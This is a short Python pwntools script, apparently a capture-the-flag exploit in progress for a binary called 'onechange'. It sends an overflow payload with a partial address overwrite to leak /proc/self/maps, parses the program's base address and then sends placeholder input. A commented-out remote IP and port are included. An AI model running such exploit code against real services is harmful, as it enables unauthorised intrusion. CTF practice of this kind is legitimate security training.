from pwn import *

#r = remote("20.102.85.102", 9999)
r = process("./onechange")
gdb.attach(r)
r.recvuntil(b"One change to do something right !!")


main_off = 0x00000000000009ba
fini_off = 0x201DF0

vmmap = b"/proc/self/mapss"
payload = vmmap + b"\x00"*17 + b"\xf0\x1d" 
r.sendline(payload)


sstuff = r.recvuntil(b'number ?')
elf_addr = sstuff[:50].split(b'\n')[2].split(b"-")[0].decode("utf-8")
elf_addr = int(elf_addr, 16)
print(hex(elf_addr))


r.sendline(b"2")

payload = "123"
r.sendline(payload)



r.interactive()